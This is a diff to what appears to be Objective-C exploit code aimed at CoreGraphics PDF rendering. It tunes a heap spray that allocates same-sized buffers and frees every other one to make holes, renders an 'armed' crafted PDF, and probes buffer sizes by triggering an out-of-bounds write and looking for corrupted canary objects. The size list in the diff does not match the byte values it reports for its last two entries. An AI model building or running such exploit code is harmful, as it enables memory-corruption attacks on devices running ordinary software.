@@ -170,15 +170,15 @@
         NSData *pdf = [self buildPDFWithFunctionCount:R rows:rows];
         // Heap spray: allocate same-sized objects, free some to create holes
         NSMutableArray *sprayObjs = [NSMutableArray array];
-        for (int i = 0; i < 256; i++) {
+        for (int i = 0; i < 64; i++) {
             NSMutableData *d = [NSMutableData dataWithLength:0x1c0]; // ~448 bytes (CG buffer size)
             [sprayObjs addObject:d];
         }
         // Free every other to create holes
-        for (int i = 0; i < 256; i += 2) {
+        for (int i = 0; i < 64; i += 2) {
             [sprayObjs replaceObjectAtIndex:i withObject:[NSNull null]];
         }
-        [report appendFormat:@"heap spray: 256 allocs, 128 holes\n"];
+        [report appendFormat:@"heap spray: 64 allocs, 32 holes\n"];
 
         [report appendFormat:@"armed: %@\n", [self renderPDFData:pdf name:@"kp-pdf-armed-r36.pdf"]];
     } else {
@@ -203,7 +203,7 @@
         // Size discovery: allocate canary objects of various sizes, trigger OOB, check corruption
         [report appendString:@"\n--- CG buffer size discovery ---\n"];
         {
-            uint32_t sizes[] = {64, 128, 192, 256, 320, 384, 448, 512, 576, 640, 768, 1024, 2048};
+            uint32_t sizes[] = {128, 256, 384, 512, 768, 1024};
             int nsizes = sizeof(sizes) / sizeof(sizes[0]);
             NSMutableArray *canaries = [NSMutableArray array];
             NSMutableIndexSet *corrupted = [NSMutableIndexSet indexSet];
@@ -240,7 +240,7 @@
                 [report appendFormat:@"*** CG BUFFER ADJACENT SIZES: %lu corrupted ***\n",
                  (unsigned long)corrupted.count];
                 [corrupted enumerateIndexesUsingBlock:^(NSUInteger idx, BOOL *stop) {
-                    [report appendFormat:@"  -> %u bytes\n", (uint32_t)idx < 13 ? (uint32_t)(64 + idx * 64) : 0];
+                    [report appendFormat:@"  -> %u bytes\n", (uint32_t)idx < 6 ? (uint32_t)(128 + idx * 128) : 0];
                 }];
             } else {
                 [report appendString:@"No canary corruption — CG buffer not adjacent to our objects.\n"];
